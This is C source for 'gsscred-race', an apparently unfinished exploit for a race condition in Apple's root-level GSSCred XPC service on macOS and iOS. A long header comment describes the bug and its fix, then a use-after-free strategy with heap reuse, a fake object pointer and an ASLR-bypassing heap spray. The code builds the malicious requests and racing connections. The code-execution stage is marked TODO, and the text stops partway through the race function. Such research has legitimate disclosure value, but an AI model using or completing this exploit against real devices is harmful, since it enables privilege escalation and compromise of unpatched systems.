/*
 * gsscred-race
 * Brandon Azad
 *
 *
 * gsscred-race
 * ================================================================================================
 *
 *  gsscred-race is an exploit for a race condition found in the com.apple.GSSCred XPC service,
 *  which runs as root on macOS and iOS and which can be reached from within the default iOS
 *  application sandbox. By creating parallel connections to the GSSCred service we can trigger a
 *  use-after-free condition leading to a call to objc_msgSend() on a controlled pointer,
 *  eventually leading to code execution inside the GSSCred process.
 *
 *
 * The vulnerability
 * ------------------------------------------------------------------------------------------------
 *
 *  The GSSCred service first creates a serial dispatch queue and initializes the XPC connection
 *  listener to run on that queue:
 *
 *  	runQueue = dispatch_queue_create("com.apple.GSSCred", DISPATCH_QUEUE_SERIAL);
 *  	heim_assert(runQueue != NULL, "dispatch_queue_create failed");
 *
 *  	conn = xpc_connection_create_mach_service("com.apple.GSSCred",
 *  	                                          runQueue,
 *  	                                          XPC_CONNECTION_MACH_SERVICE_LISTENER);
 *
 *  	xpc_connection_set_event_handler(conn, ^(xpc_object_t object) {
 *  		GSSCred_event_handler(object);
 *  	});
 *
 *  The XPC runtime will dispatch a call to GSSCred_event_handler() each time an event is received
 *  on the listener connection. In particular, when a client creates a connection to
 *  com.apple.GSSCred and sends the first XPC message, GSSCred_event_handler() will be invoked with
 *  the server-side XPC connection object.
 *
 *  Using a serial dispatch queue is important for clients that don't specifically implement
 *  support for parallel connections (for example, by protecting concurrent object accesses with
 *  locks). GSSCred does not implement any locking, relying on the serial processing of XPC events
 *  to protect against race conditions.
 *
 *  The GSSCred_event_handler() function is responsible for initializing an incoming client
 *  connection. It creates a server-side "peer" object to represent the connection context and sets
 *  the event handler that the XPC runtime will call when an event (such as a message from the
 *  client) is received on the connection:
 *
 *  	static void GSSCred_event_handler(xpc_connection_t peerconn)
 *  	{
 *  		struct peer *peer;
 *
 *  		peer = malloc(sizeof(*peer));
 *  		heim_assert(peer != NULL, "out of memory");
 *
 *  		peer->peer = peerconn;
 *  		peer->bundleID = CopySigningIdentitier(peerconn);
 *  		if (peer->bundleID == NULL) {
 *  			...
 *  		}
 *  		peer->session = HeimCredCopySession(xpc_connection_get_asid(peerconn));
 *  		heim_assert(peer->session != NULL, "out of memory");
 *
 *  		xpc_connection_set_context(peerconn, peer);
 *  		xpc_connection_set_finalizer_f(peerconn, peer_final);
 *
 *  		xpc_connection_set_event_handler(peerconn, ^(xpc_object_t event) {
 *  			GSSCred_peer_event_handler(peer, event);
 *  		});
 *  		xpc_connection_resume(peerconn);
 *  	}
 *
 *  The problem is that the target dispatch queue for the connection to the client ("peerconn" in
 *  the code) was never specified, and therefore defaults to libdispatch's default target queue,
 *  DISPATCH_TARGET_QUEUE_DEFAULT, which is a concurrent queue. From the documentation for
 *  xpc_connection_set_event_handler() in xpc/connection.h:
 *
 *  	Connections received by listeners are equivalent to those returned by
 *  	xpc_connection_create() with a non-NULL name argument and a NULL targetq
 *  	argument with the exception that you do not hold a reference on them.
 *  	You must set an event handler and activate the connection.
 *
 *  And here's the documentation from xpc_connection_create() about the targetq parameter:
 *
 *  	@param targetq
 *  	The GCD queue to which the event handler block will be submitted. This
 *  	parameter may be NULL, in which case the connection's target queue will be
 *  	libdispatch's default target queue, defined as DISPATCH_TARGET_QUEUE_DEFAULT.
 *  	The target queue may be changed later with a call to
 *  	xpc_connection_set_target_queue().
 *
 *  Thus, setting the target queue for the listener connection only is not sufficient: client
 *  connections will be received serially in the listener event handler, but the event handlers for
 *  different client connections can run in parallel.
 *
 *  The XPC documentation about concurrent execution of event handlers in different clients may be
 *  misleading at first glance. The documentation for xpc_connection_set_target_queue() states:
 *
 *  	The XPC runtime guarantees this non-preemptiveness even for concurrent target
 *  	queues. If the target queue is a concurrent queue, then XPC still guarantees
 *  	that there will never be more than one invocation of the connection's event
 *  	handler block executing concurrently. If you wish to process events
 *  	concurrently, you can dispatch_async(3) to a concurrent queue from within
 *  	the event handler.
 *
 *  It's important to understand that this guarantee is strictly per-connection: event handler
 *  blocks for different connections, even if they share the same underlying code, are considered
 *  different event handler blocks and are allowed to run concurrently.
 *
 *  The fix for this issue in GSSCred is to insert a call to xpc_connection_set_target_queue()
 *  before activating the client connection with xpc_connection_resume() to set the target
 *  queue for the client connection to the serial queue created earlier. For example:
 *
 *  		xpc_connection_set_event_handler(peerconn, ^(xpc_object_t event) {
 *  			GSSCred_peer_event_handler(peer, event);
 *  		});
 *  		xpc_connection_set_target_queue(peerconn, runQueue);		// added
 *  		xpc_connection_resume(peerconn);
 *
 *  This will guarantee that all client requests across all connections will be handled serially.
 *
 *
 * Exploit strategy
 * ------------------------------------------------------------------------------------------------
 *
 *  There are several ways to exploit this race condition, with varying levels of difficulty. After
 *  much experimentation, I eventually settled on triggering a use-after-free in the function
 *  do_SetAttrs() by invoking the do_Delete() function in parallel from another connection.
 *
 *
 *  Creating a use-after-free
 *  -------------------------
 *
 *  The do_SetAttrs() function handles the "setattributes" command from the client. Here is the
 *  code (edited for presentation):
 *
 *  	static void
 *  	do_SetAttrs(struct peer *peer, xpc_object_t request, xpc_object_t reply)
 *  	{
 *  		CFUUIDRef uuid = HeimCredCopyUUID(request, "uuid");
 *  		CFMutableDictionaryRef attrs;
 *  		CFErrorRef error = NULL;
 *
 *  		if (uuid == NULL)
 *  			return;
 *
 *  		if (!checkACLInCredentialChain(peer, uuid, NULL)) {
 *  			CFRelease(uuid);
 *  			return;
 *  		}
 *
 *  		HeimCredRef cred = (HeimCredRef)CFDictionaryGetValue(	// (a) The credential
 *  				peer->session->items, uuid);		//     pointer is copied to
 *  		CFRelease(uuid);					//     the stack.
 *  		if (cred == NULL)
 *  			return;
 *
 *  		heim_assert(CFGetTypeID(cred) == HeimCredGetTypeID(),
 *  				"cred wrong type");
 *
 *  		if (cred->attributes) {
 *  			attrs = CFDictionaryCreateMutableCopy(NULL, 0,
 *  					cred->attributes);
 *  			if (attrs == NULL)
 *  				return;
 *  		} else {
 *  			attrs = CFDictionaryCreateMutable(NULL, 0,
 *  					&kCFTypeDictionaryKeyCallBacks,
 *  					&kCFTypeDictionaryValueCallBacks);
 *  		}
 *
 *  		CFDictionaryRef replacementAttrs =			// (b) The attributes dict
 *  			HeimCredMessageCopyAttributes(			//     is deserialized from
 *  					request, "attributes",		//     the XPC message.
 *  					CFDictionaryGetTypeID());
 *  		if (replacementAttrs == NULL) {
 *  			CFRelease(attrs);
 *  			goto out;
 *  		}
 *
 *  		CFDictionaryApplyFunction(replacementAttrs,
 *  				updateCred, attrs);
 *  		CFRELEASE_NULL(replacementAttrs);
 *
 *  		if (!validateObject(attrs, &error)) {			// (c) The deserialized
 *  			addErrorToReply(reply, error);			//     attributes dict is
 *  			goto out;					//     validated.
 *  		}
 *
 *  		handleDefaultCredentialUpdate(peer->session,		// (d) The credential
 *  				cred, attrs);				//     pointer from (a) is
 *  									//     used.
 *  		// make sure the current caller is on the ACL list
 *  		addPeerToACL(peer, attrs);
 *
 *  		CFRELEASE_NULL(cred->attributes);
 *  		cred->attributes = attrs;
 *  	out:
 *  		CFRELEASE_NULL(error);
 *  	}
 *
 *  Since we fully control the contents of the XPC request, we can make most deserialization
 *  commands take a long time to run, which opens a nice wide race window. Here in do_SetAttrs()
 *  the HeimCredMessageCopyAttributes() function performs deserialization, meaning we have an
 *  opportunity to change the program state during its execution.
 *
 *  To unexpectedly change the program state while do_SetAttrs() is stalled we will use the
 *  do_Delete() function. This function is responsible for handling a "delete" command from the
 *  client. It will delete all credentials matching the deletion query. We can send a "delete"
 *  request to free the credential pointer held by do_SetAttrs() while the latter is busy
 *  deserializing.
 *
 *  Using these two functions, the race condition flow goes like this:
 *
 *  1. Create the credential we'll use for the UAF.
 *
 *  2. Send a "setattributes" request for the target credential with an attributes dictionary that
 *     will take a long time to deserialize. A pointer to the credential will be saved on the stack
 *     (or in a register) while HeimCredMessageCopyAttributes() is deserializing, allocating
 *     objects in a tight loop.
 *
 *  3. While do_SetAttrs() is still in the allocation loop, send a "delete" request on a second
 *     connection to delete the target credential. This second connection's event handler will run
 *     on another thread and free the credential. The freed credential object will be added to the
 *     heap freelist.
 *
 *  4. If we're lucky, back in the first connection's thread, the freed credential object will be
 *     reallocated by HeimCredMessageCopyAttributes() to store deserialized data from the
 *     attributes dictionary, giving us control over some of the fields of the freed credential.
 *
 *  5. Eventually HeimCredMessageCopyAttributes() finishes and do_SetAttrs() resumes, not knowing
 *     that the contents of the credential pointer it stored have been changed. It passes the
 *     corrupted credential to handleDefaultCredentialUpdate() and all hell breaks loose.
 *
 *
 *  Corrupting the HeimCred
 *  -----------------------
 *
 *  Now, it's worth talking about how exactly we're going to overwrite the HeimCred object. Here's
 *  the structure definition:
 *
 *  	struct HeimCred_s {
 *  		CFRuntimeBase   runtime;	// 00: 0x10 bytes
 *  		CFUUIDRef       uuid;		// 10: 8 bytes
 *  		CFDictionaryRef attributes;	// 18: 8 bytes
 *  		HeimMech *      mech;		// 20: 8 bytes
 *  	};					// Total: 0x28 bytes
 *
 *  Since the full structure is 0x28 bytes, it will be allocated from and freed to the 0x30
 *  freelist, which is used for heap objects between 0x20 and 0x30 bytes in size. This means that
 *  whatever deserialization is happening in HeimCredMessageCopyAttributes(), we'll need to ensure
 *  that it allocates from the 0x30 freelist in a tight loop, allowing the freed HeimCred to be
 *  reused.
 *
 *  However, we can't pass just anything to HeimCredMessageCopyAttributes(): we also need the
 *  deserialized dictionary to pass the call to validateObject() later on. Otherwise, even if we
 *  manage to corrupt the HeimCred object, it won't be used afterwards, rendering our exploit
 *  pointless.
 *
 *  It turns out the only way we can both allocate objects in an unbounded loop and pass the
 *  validateObject() check is by supplying an attributes dictionary containing an array of strings
 *  under the "kHEIMAttrBundleIdentifierACL" key. All other collections of objects will be rejected
 *  by validateObject(). Thus, the only object we can allocate in a loop is OS_xpc_string, the
 *  object type for an XPC string.
 *
 *  Fortunately for us, OS_xpc_string type is also allocated out of the 0x30 freelist. Here is its
 *  structure, as far as I can tell by reversing libxpc:
 *
 *  	struct OS_xpc_string {
 *  		objc_class *    isa;		// 00: 8 bytes
 *  		uint32_t        refcnt;		// 08: 4 bytes
 *  		uint32_t        xrefcnt;	// 0c: 4 bytes
 *  		uint32_t        flags;		// 10: 4 bytes
 *  		uint32_t        wire_size;	// 14: 4 bytes
 *  		uint64_t        length;		// 18: 8 bytes
 *  		char *          string;		// 20: 8 bytes
 *  	};					// Total: 0x28 bytes
 *
 *  Most of these fields should be self-explanatory: "isa" is a pointer to the Objective-C class
 *  for OS_xpc_string, "wire_size" is the length of the serialized string, "length" is the length
 *  of the C string, and "string" is a pointer to the characters of the C string. Of these fields,
 *  we have partial control over the values of "wire_size" and "length", and we have nearly full
 *  control of the contents of "string".
 *
 *  For the use-after-free to be exploitable we want the fields of OS_xpc_string that we control to
 *  overlap those of HeimCred, such that creating the OS_xpc_string will corrupt the HeimCred
 *  object in an interesting way. Looking back to the definition of the HeimCred structure, we can
 *  see that the "wire_size" field partially overlaps the last 4 bytes of "uuid", "length" overlaps
 *  "attributes", and "string" overlaps "mech". This means that if the HeimCred's memory is reused
 *  as an OS_xpc_string, we have partial control of the values of the HeimCred's "uuid" and
 *  "attributes" pointers and nearly full control of memory pointed to by the HeimCred's "mech"
 *  pointer. Since it would be difficult to generate a string long enough that its length is a
 *  valid pointer, the natural field to target for exploitation is "mech".
 *
 *  Here's the HeimMech structure:
 *
 *  	struct HeimMech {
 *  		CFRuntimeBase           runtime;		// 00: 0x10 bytes
 *  		CFStringRef             name;			// 10: 8 bytes
 *  		HeimCredStatusCallback  statusCallback;		// 18: 8 bytes
 *  		HeimCredAuthCallback    authCallback;		// 20: 8 bytes
 *  	};
 *
 *  All of these fields are attractive targets. Controlling the isa pointer of an Objective-C class
 *  allows us to gain code execution if an Objective-C message is sent to the object (see Phrack,
 *  "Modern Objective-C Exploitation Techniques" [1]). And the last 2 fields are pointers to
 *  callback functions, which is an even easier route to PC control (if we can get them called).
 *
 *  To determine which field or fields are of interest, we need to look at how the corrupted
 *  HeimCred is used. The first time it is used after the call to HeimCredMessageCopyAttributes()
 *  is when it is passed as a parameter to handleDefaultCredentialUpdate().
 *
 *  Here's the source code of handleDefaultCredentialUpdate(), with some irrelevant code removed:
 *
 *  	static void
 *  	handleDefaultCredentialUpdate(struct HeimSession *session,
 *  			HeimCredRef cred, CFDictionaryRef attrs)
 *  	{
 *  		heim_assert(cred->mech != NULL, "mech is NULL, "	// (e) mech must not be
 *  				"schame validation doesn't work ?");	//     NULL.
 *
 *  		CFUUIDRef oldDefault = CFDictionaryGetValue(		// (f) Corrupted name
 *  				session->defaultCredentials,		//     pointer passed to
 *  				cred->mech->name);			//     CF function.
 *
 *  		CFBooleanRef defaultCredential = CFDictionaryGetValue(
 *  				attrs, kHEIMAttrDefaultCredential);
 *  		...
 *
 *  		CFDictionarySetValue(session->defaultCredentials,
 *  				cred->mech->name, cred->uuid);
 *
 *  		notifyChangedCaches();
 *  	}
 *
 *  Since the corrupted HeimCred's "mech" field will never be NULL, the assertion will pass. Next,
 *  the "mech" field will be dereferenced to read the "name" pointer, which is passed to
 *  CFDictionaryGetValue(). This is perfect: we control the memory pointed to by "mech", so we can
 *  control the value of the "name" pointer. If we can ensure that "name" points to a fake
 *  Objective-C object, then we're on our way to code execution.
 *
 *
 *  Pointing to controlled data
 *  ---------------------------
 *
 *  At this point it's worth taking some time to talk about where exactly "name" will point.
 *
 *  We want "name" to point to memory we control, but due to ASLR we don't know any addresses in
 *  the GSSCred process. The traditional way to bypass ASLR when we don't know where our
 *  allocations will be placed is using a heap spray. However, performing a traditional heap spray
 *  over XPC would be quite slow, since the kernel would need to copy a huge amount of data from
 *  our address space to GSSCred's address space. Fortunately for us, libxpc contains an
 *  optimization: if we're sending an XPC data object larger than 0x4000 bytes, libxpc will instead
 *  create a Mach memory entry representing the data and send that to the target instead. Then,
 *  when the message is deserialized in the recipient, libxpc will map the memory entry directly
 *  into the recipient's address space by calling mach_vm_map(). The result is a fast, copy-free
 *  duplication of our memory in the recipient process's address space. (See [2] for Ian Beer's
 *  triple_fetch exploit, which is where I learned of this technique and the parameters used here.)
 *
 *  Since mach_vm_map() is called with the VM_FLAGS_ANYWHERE flag, the kernel will choose the
 *  address of the mapping. Presumably to minimize address space fragmentation, the kernel will
 *  typically choose an address close to the program base. The program base is usually located at
 *  an address like 0x000000010c65d000: somewhere above but close to 4GB (0x100000000), with the
 *  exact address randomized by ASLR. The kernel might then place large VM_ALLOCATE objects at an
 *  address like 0x0000000116097000: after the program, but still fairly close to 0x100000000. By
 *  comparison, the MALLOC_TINY heap (which is where all of our objects will live) might start at
 *  0x00007fb6f0400000 on macOS and 0x0000000107100000 on iOS.
 *
 *  Using a memory entry heap spray, we can fill 1GB of GSSCred's virtual memory space with
 *  controlled data. Because the sprayed data will follow closely behind the program base, there's
 *  a good chance that addresses close to 0x0000000120000000 will contain our sprayed data.
 *
 *  This means we'll want our corrupted "name" field to contain a pointer like 0x0000000120000000.
 *  However, there's a problem: the fake HeimMech object from which the "name" field will be read
 *  was allocated as the string contents of an OS_xpc_string object. During deserialization libxpc
 *  allocates this data using strdup() on the original contents of the XPC message. Thus, we will
 *  only control the contents of the fake HeimMech object up to the first null byte, and clearly
 *  the address 0x0000000120000000, which we want as the HeimMech's "name" field, is full of null
 *  bytes.
 *
 *  Luckily, this restriction isn't as damaging as it at first seems. Modern macOS and iOS
 *  platforms are all little-endian, meaning the pointer is laid out in memory least significant
 *  byte to most significant byte. If instead we use an address like 0x0000000120202020 (with all
 *  the null bytes at the start) for our controlled data, then the low 5 bytes of the address will
 *  be copied into the "name" field, and the null terminator will zero out the 6th. This leaves
 *  just the 2 high bytes of the "name" field with whatever heap garbage they had originally.
 *
 *  It turns out that in practice, those uninitialized heap bytes are usually zero, meaning that we
 *  usually end up with exactly the value we want in the "name" field of our fake HeimMech. :)
 *
 *
 *  Code execution
 *  --------------
 *
 *  So, to summarize our progress so far, we can corrupt the HeimCred object such that its "mech"
 *  pointer points to a fake HeimMech object, and the HeimMech object's "name" field points to
 *  sprayed data whose contents we control. And we're about to enter a call to
 *  CFDictionaryGetValue() with our "name" pointer as the second parameter.
 *
 *
 *  TODO
 *
 *
 *  Fine-tuning
 *  -----------
 *
 *  After I designed the basic exploit flow, I needed to choose specific values for various
 *  parameters.
 *
 *  In some experiments on my 2011 MacBook Pro, I measured that it usually took less than a
 *  millisecond (and often close to a fifth of that) between when I sent a message to GSSCred and
 *  when GSSCred sent back a reply. Thus, I figured that a 10 millisecond race window for the
 *  "delete" request would be plenty. Further experiments showed that in order to make
 *  deserializing an array of strings take 10 milliseconds, I needed the array to contain about
 *  26000 strings.
 *
 *
 * References
 * ------------------------------------------------------------------------------------------------
 *
 *  [1]: http://phrack.org/issues/69/9.html
 *  [2]: https://bugs.chromium.org/p/project-zero/issues/detail?id=1247
 *
 *
 * Notes
 * ------------------------------------------------------------------------------------------------
 *
 *  - The overhead of libxpc is messing with the timing of the exploit. My race window is happening
 *    while xpc_connection_send_message_with_reply() is returning. I'll need to implement my own
 *    libxpc-compatible XPC client to frontend all of the serialization work.
 *
 *  - The race window on my iPhone 6s is actually much different than I imagined: From about 1ms to
 *    somewhere around 20ms we get OS_xpc_string reuse, from about 33ms to 48ms we get CFString
 *    reuse, with a possible sweet spot around 38ms. (The middle area is fuzzy, I wasn't paying
 *    close attention.) CFString reuse is comparably reliable to OS_xpc_string (perhaps even
 *    better), but it's harder to hit that window. I still don't know why my iPhone 8 was
 *    experiencing CFString reuse at 6ms delay.
 *
 */

#include "gsscred_race.h"

#include <assert.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <xpc/xpc.h>

#include <CoreFoundation/CoreFoundation.h>

// ---- Debugging macros --------------------------------------------------------------------------

#ifndef DEBUG_LEVEL
#define DEBUG_LEVEL DEBUG
#endif

#define DEBUG_AT_LEVEL(level)	DEBUG && level <= DEBUG_LEVEL

#if DEBUG
#define DEBUG_TRACE(fmt, ...)		printf("Debug: "fmt"\n", ##__VA_ARGS__)
#define DEBUG_TRACE_LEVEL(level, fmt, ...)			\
	do {							\
		if (level <= DEBUG_LEVEL) {			\
			DEBUG_TRACE(fmt, ##__VA_ARGS__);	\
		}						\
	} while (0)
#else
#define DEBUG_TRACE(fmt, ...)		do {} while (0)
#define DEBUG_TRACE_LEVEL(fmt, ...)	do {} while (0)
#endif
#define WARNING(fmt, ...)		printf("Warning: "fmt"\n", ##__VA_ARGS__)
#define ERROR(fmt, ...)			printf("Error: "fmt"\n", ##__VA_ARGS__)

// ---- Utility functions and macros --------------------------------------------------------------

#define min(a,b)	((a) < (b) ? (a) : (b))
#define max(a,b)	((a) > (b) ? (a) : (b))

// ---- Some definitions from Heimdal-520 ---------------------------------------------------------

static const char *kHEIMObjectType              = "kHEIMObjectType";
static const char *kHEIMObjectKerberos          = "kHEIMObjectKerberos";
static const char *kHEIMAttrType                = "kHEIMAttrType";
static const char *kHEIMTypeKerberos            = "kHEIMTypeKerberos";
static const char *kHEIMAttrUUID                = "kHEIMAttrUUID";
static const char *kHEIMAttrBundleIdentifierACL = "kHEIMAttrBundleIdentifierACL";

// ---- Exploit parameters ------------------------------------------------------------------------

static const char *GSSCRED_SERVICE_NAME = "com.apple.GSSCred";

static const size_t UAF_STRING_SIZE               = 0x30;
static const size_t UAF_STRING_COUNT              = 26000;	// 10 ms
static const size_t SETATTRIBUTES_TO_DELETE_DELAY = 6000;	// 6 ms
static const size_t POST_CREATE_CREDENTIAL_DELAY  = 10000;	// 10 ms
static const size_t RETRY_RACE_DELAY              = 300000;	// 300 ms

// ---- Parameters for building the controlled page -----------------------------------------------

static const size_t    DATA_SIZE                = 0x4000;
static const size_t    DATA_COUNT_PER_SPRAY     = 0x100;
//static const size_t    DATA_SPRAY_COUNT         = 0xc0; // TODO
static const uintptr_t DATA_ADDRESS             = 0x0000000120204000;
static const size_t    DATA_OFFSET__name_object = 0x20;

// ---- Structure offsets -------------------------------------------------------------------------

static const size_t OFFSET__HeimMech__name = 0x10;

// ---- Exploit implementation --------------------------------------------------------------------

// State for managing the GSSCred race.
struct gsscred_race_state {
	// The connection on which we will send the setattributes request.
	xpc_connection_t setattributes_connection;
	// The connection on which we will send the delete request.
	xpc_connection_t delete_connection;
	// The create request, which will create the credential.
	xpc_object_t create_request;
	// The setattributes request. The uuid parameter will need to be changed each attempt.
	xpc_object_t setattributes_request;
	// The delete request, which will delete all the children followed by the parent.
	xpc_object_t delete_request;
	// A semaphore that will be signalled when we receive the setattributes reply.
	dispatch_semaphore_t setattributes_reply_done;
	// Whether either connection has been interrupted, indicating a crash.
	bool connection_interrupted;
};

// Generate the string that will be repeatedly deserialized and allocated by GSSCred. If all goes
// according to plan, the HeimCred object will be freed and then reallocated as an OS_xpc_string,
// and the OS_xpc_string's string data pointer overlaps perfectly with the HeimCred's "mech"
// pointer. Thus, after we've corrupted the HeimCred, its "mech" field will be a pointer to this
// string data. We want this fake HeimMech object's "name" field to point to our controlled data at
// DATA_ADDRESS.
static void
gsscred_race_generate_uaf_string(char *uaf_string) {
	uint8_t *fake_HeimMech = (uint8_t *)uaf_string;
	// In lieu of the traditional heap padding, we'll use this special value, which has the
	// interesting property that it is both a valid CFString pointer and a valid UTF-8 string.
	// :)
	// NOTE: This doesn't play well when targeting CFString for the UAF rather than
	// OS_xpc_string. Switch back to A's if targeting CFString.
	for (size_t i = 0; i < UAF_STRING_SIZE / sizeof(uint64_t); i++) {
		((uint64_t *)fake_HeimMech)[i] = 0xa0c2410142042417;
	}
	uint8_t *name_field = fake_HeimMech + OFFSET__HeimMech__name;
	*(uint64_t *)name_field = DATA_ADDRESS + DATA_OFFSET__name_object;
}

// TODO
static void
gsscred_race_generate_spray_data(uint8_t *data) {
	// TODO
	memset(data, 0x41, DATA_SIZE);
}

// TODO
static xpc_object_t
gsscred_race_build_spray_data_object() {
	uint8_t data[DATA_SIZE];
	gsscred_race_generate_spray_data(data);
	size_t spray_data_size = DATA_SIZE * DATA_COUNT_PER_SPRAY;
	uint8_t *spray_data = malloc(spray_data_size);
	assert(spray_data != NULL);
	for (size_t i = 0; i < DATA_COUNT_PER_SPRAY; i++) {
		memcpy(spray_data + i * DATA_SIZE, data, DATA_SIZE);
	}
	xpc_object_t xpc_spray_data = xpc_data_create(spray_data, spray_data_size);
	assert(xpc_spray_data != NULL);
	free(spray_data);
	return xpc_spray_data;
}

// Build the request objects for the GSSCred race. We do this all upfront.
static void
gsscred_race_build_requests(struct gsscred_race_state *state) {
	uuid_t uuid  = { 0xab };

	// Build the create request for the credential:
	// {
	//     "command":    "create",
	//     "attributes": {
	//         "kHEIMObjectType": "kHEIMObjectKerberos",
	//         "kHEIMAttrType":   "kHEIMTypeKerberos",
	//         "kHEIMAttrUUID":   ab,
	//     },
	// }
	xpc_object_t create_attributes = xpc_dictionary_create(NULL, NULL, 0);
	xpc_object_t create_request    = xpc_dictionary_create(NULL, NULL, 0);
	xpc_dictionary_set_string(create_attributes, kHEIMObjectType, kHEIMObjectKerberos);
	xpc_dictionary_set_string(create_attributes, kHEIMAttrType,   kHEIMTypeKerberos);
	xpc_dictionary_set_uuid(  create_attributes, kHEIMAttrUUID,   uuid);
	xpc_dictionary_set_string(create_request, "command",    "create");
	xpc_dictionary_set_value( create_request, "attributes", create_attributes);
	xpc_release(create_attributes);
	state->create_request = create_request;

	// Generate the string that will be deserialized repeatedly and be used in the UAF to point
	// to our controlled data at DATA_ADDRESS.
	char uaf_string[UAF_STRING_SIZE];
	gsscred_race_generate_uaf_string(uaf_string);

	// Generate the XPC data object that we will spray into GSSCred to map DATA_ADDRESS with
	// controlled contents.
	xpc_object_t spray_data_object = gsscred_race_build_spray_data_object();

	// Build the setattributes request for the target credential:
	// {
	//     "command":    "setattributes",
	//     "uuid":       ab,
	//     "attributes": {
	//         "kHEIMAttrBundleIdentifierACL": [
	//             "AAAA...",
	//             "AAAA...",
	//             ...,
	//         ],
	//     },
	//     "data_0":     <memory entry>,
	//     "data_1":     <memory entry>,
	//     ...,
	// }
	xpc_object_t new_acl               = xpc_array_create(NULL, 0);
	xpc_object_t new_attributes        = xpc_dictionary_create(NULL, NULL, 0);
	xpc_object_t setattributes_request = xpc_dictionary_create(NULL, NULL, 0);
	for (size_t i = 0; i < UAF_STRING_COUNT; i++) {
		xpc_array_set_string(new_acl, XPC_ARRAY_APPEND, uaf_string);
	}
	xpc_dictionary_set_value(new_attributes, kHEIMAttrBundleIdentifierACL, new_acl);
	xpc_dictionary_set_string(setattributes_request, "command",    "setattributes");
	xpc_dictionary_set_uuid(  setattributes_request, "uuid",       uuid);
	xpc_dictionary_set_value( setattributes_request, "attributes", new_attributes);
	// TODO
	//for (size_t i = 0; i < DATA_SPRAY_COUNT; i++) {
	//	char key[20];
	//	snprintf(key, sizeof(key), "data_%zu", i);
	//	xpc_dictionary_set_value(setattributes_request, key, spray_data_object);
	//}
	xpc_release(new_acl);
	xpc_release(new_attributes);
	xpc_release(spray_data_object);
	state->setattributes_request = setattributes_request;

	// Build the delete request for the parent.
	// {
	//     "command": "delete",
	//     "query":   {
	//         "kHEIMAttrType":   "kHEIMTypeKerberos",
	//         "kHEIMAttrUUID":   ab 0000,
	//     },
	// }
	xpc_object_t delete_query   = xpc_dictionary_create(NULL, NULL, 0);
	xpc_object_t delete_request = xpc_dictionary_create(NULL, NULL, 0);
	xpc_dictionary_set_string(delete_query, kHEIMAttrType, kHEIMTypeKerberos);
	xpc_dictionary_set_uuid(  delete_query, kHEIMAttrUUID, uuid);
	xpc_dictionary_set_string(delete_request, "command", "delete");
	xpc_dictionary_set_value( delete_request, "query",   delete_query);
	xpc_release(delete_query);
	state->delete_request = delete_request;
}

// Generate a connection to GSSCred with the specified event handler.
static xpc_connection_t
gsscred_xpc_connect(xpc_handler_t handler) {
	xpc_connection_t connection
		= xpc_connection_create_mach_service(GSSCRED_SERVICE_NAME, NULL, 0);
	assert(connection != NULL);
	xpc_connection_set_event_handler(connection, handler);
	xpc_connection_activate(connection);
	return connection;
}

// Check whether the given event indicates that the connection was interrupted, and if so, set the
// interrupted flag.
static void
gsscred_race_check_interrupted(struct gsscred_race_state *state, xpc_object_t event) {
	if (event == XPC_ERROR_CONNECTION_INTERRUPTED) {
		state->connection_interrupted = true;
	}
}

// Create all the GSSCred connections.
static void
gsscred_race_open_connections(struct gsscred_race_state *state) {
	// Create the connection on which we will send the setattributes message.
	state->setattributes_connection = gsscred_xpc_connect(^(xpc_object_t event) {
		gsscred_race_check_interrupted(state, event);
#if DEBUG_AT_LEVEL(3)
		char *desc = xpc_copy_description(event);
		DEBUG_TRACE("setattributes connection event: %s", desc);
		free(desc);
#endif
	});

	// Create the connection on which we will send the delete message.
	state->delete_connection = gsscred_xpc_connect(^(xpc_object_t event) {
		gsscred_race_check_interrupted(state, event);
#if DEBUG_AT_LEVEL(3)
		char *desc = xpc_copy_description(event);
		DEBUG_TRACE("delete connection event: %s", desc);
		free(desc);
#endif
	});

	// Initialize state variables for the connections.
	state->connection_interrupted = false;
}

// Close all the GSSCred connections.
static void
gsscred_race_close_connections(struct gsscred_race_state *state) {
	xpc_connection_cancel(state->setattributes_connection);
	xpc_connection_cancel(state->delete_connection);
	xpc_release(state->setattributes_connection);
	xpc_release(state->delete_connection);
}

// Initialize the state for exploiting the GSSCred race condition.
static void
gsscred_race_init(struct gsscred_race_state *state) {
	gsscred_race_build_requests(state);
	gsscred_race_open_connections(state);
	state->setattributes_reply_done = dispatch_semaphore_create(0);
}

// Clean up all resources used by the GSSCred race state.
static void
gsscred_race_deinit(struct gsscred_race_state *state) {
	gsscred_race_close_connections(state);
	xpc_release(state->create_request);
	xpc_release(state->setattributes_request);
	xpc_release(state->delete_request);
	dispatch_release(state->setattributes_reply_done);
}

// Send the credential creation request to GSSCred.
static bool
gsscred_race_create_credential_sync(struct gsscred_race_state *state) {
	xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
			state->delete_connection,
			state->create_request);
#if DEBUG_AT_LEVEL(3)
	char *desc = xpc_copy_description(reply);
	DEBUG_TRACE("create reply: %s", desc);
	free(desc);
#endif
	bool success = (xpc_dictionary_get_value(reply, "error") == NULL);
	xpc_release(reply);
	return success;
}

// Send the setattributes request asynchronously. This will cause do_SetAttrs() to stall in
// HeimCredMessageCopyAttributes() for awhile (hopefully around 10 milliseconds) while it
// continuously allocates CFString objects.
static void
gsscred_race_setattributes_async(struct gsscred_race_state *state) {
	// Send the setattributes message asynchronously.
	xpc_connection_send_message_with_reply(
			state->setattributes_connection,
			state->setattributes_request,
			NULL,
			^(xpc_object_t reply) {
		gsscred_race_check_interrupted(state, reply);
		dispatch_semaphore_signal(state->setattributes_reply_done);
#if DEBUG_AT_LEVEL(3)
		// We never expect feedback.
		char *desc = xpc_copy_description(reply);
		DEBUG_TRACE("setattributes reply: %s", desc);
		free(desc);
#endif
#if DEBUG
		assert(xpc_dictionary_get_value(reply, "error") == NULL);
#endif
	});
}

// Send the delete request synchronously. This will cause the target credential to be deleted
// and hopefully allow it to be reallocated as a CFString for setattributes.
static void
gsscred_race_delete_credential_sync(struct gsscred_race_state *state) {
	xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
			state->delete_connection,
			state->delete_request);
#if DEBUG_AT_LEVEL(3)
	char *desc = xpc_copy_description(reply);
	DEBUG_TRACE("delete reply: %s", desc);
	free(desc);
#endif
	xpc_release(reply);
}

// Wait for all asynchronous messages to finish.
static void
gsscred_race_synchronize(struct gsscred_race_state *state) {
	// We're only waiting for setattributes; all other requests are synchronous.
	dispatch_semaphore_wait(state->setattributes_reply_done, DISPATCH_TIME_FOREVER);
}

// Run the race condition.
static bool
gsscred_race_run() {
	bool success = false;
	struct gsscred_race_state state;

	gsscred_race_init(&state);

